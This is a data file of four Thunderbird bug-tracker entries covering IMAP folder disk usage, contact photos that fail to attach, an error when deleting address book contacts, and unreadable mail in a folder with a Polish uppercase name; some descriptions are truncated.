1619136,Disk space local imap folder compared to online version,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Compare the offline imap folder size to that of the online one. The imap folder is connected to gmail and I've compression turned on in Thunderbird. Actual results: The online (gmail) uses 3.7GB whereas my Thunderbird imap folder is 8.1GB large. Expected results: The folder sizes were expected to be comparable. Of course, a Thunderbird and Google might use different methods to store/compress data but this does not justify this large of a difference. It should be noted that the '[Gmail].sbd/Alle e-mail' (all e-mail) file is 2.4GB and my 'INBOX' file is 2.7GB. These are (by far) using the most disk space of all files. I found some information online but they seem to be (very) outdated: - http://forums.mozillazine.org/viewtopic.php?f=39&t=2978753 (2015) - http://kb.mozillazine.org/Minimize_the_size_of_a_profile (year unknown) - https://bugzilla.mozilla.org/show_bug.cgi?id=721316#c13 (2012) As all my accounts are based on gmail I cannot verify whether the issue is in the way that thunderbirds create folders or if it is an IMAP or a google related problem. (for now, I reported th"
1619155,Adding photo to contact fails,RESOLVED,--,FIXED,"Adding a photo to a contact not seem to work at all. Seen on 75.0a1 (2020-02-27) (64-bit). I'm aware that this is filed against the current (alias ""old"") AB, but then, we are not sure how many more years to wait for the new AB, and in the meantime, maybe things should not be totally broken like this. STR 1) In main address book, select ""Personal Address Book"" (bypass potential problems of ""All Address books"") 2) New Contact (from AB toolbar), optionally fill name and email, optionally create the contact first and re-edit contact 3) From contact's photo tab, try adding a photo using any of the 3 methods provided. Actual result: - checking radio box before adding photo fails, jumps back to ""Generic photo"" - With Browse for Local file (On this computer), file name gets added, unreadable bc file icon gets repeated in the background of the input box (see screenshot), radio state doesn't update, photo does not appear (I tried a regular .jpg file which displays correctly elsewhere) - Same for ""On the Web"" - nothing - Same for Drag and drop - nothing Aceman, any ideas/comments?"
1619157,"Deleting contacts or Mailing lists from ""All address books"" view in contacts side bar fails with error",RESOLVED,--,FIXED,"### STR ### 1) composition with contacts side bar, ensure ""All Address Books"" is shown 2) select a contact from ""All Address Books"" view (contact originates from ""Personal AB"") 3) press DEL 4) repeat same STR for Mailing list from ""All Address Books"" view (mailing list originates from ""Personal AB"") This works in current release version 68.5.0 (32-Bit), but fails on Trunk 75.0a1 (2020-02-27) (64-bit), so it's a regression. Alice, would you like to find the regression window? No obligations, just asking if. ### Actual result ### - deleting contact from ""All ABs"" view does nothing, 2 errors in console: ```` TypeError: can't access property ""isMailList"", selectedDir is null abCommon.js:429:11 AbDelete chrome://messenger/content/addressbook/abCommon.js:429 doCommand chrome://messenger/content/addressbook/abResultsPane.js:519 goDoCommand chrome://global/content/globalOverlay.js:101 oncommand chrome://messenger/content/messengercompose/messengercompose.xhtml:1 An error occurred executing the cmd_delete command: [Exception... ""[JavaScript Error: ""can't access property ""isMailList"", selectedDir is null"" {file: ""chrome://messenger/content/addressbook/abCommon.js"" line: 429}]'[JavaScript Err"
1619218,"emails in folder are unreadable with folder name ""RÓŻNE""",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Create and name folder by polish word ""RÓŻNE"" (must be uppercase). Actual results: emails in folder are unreadable. Change folder to lowercase or any other name fix issue"
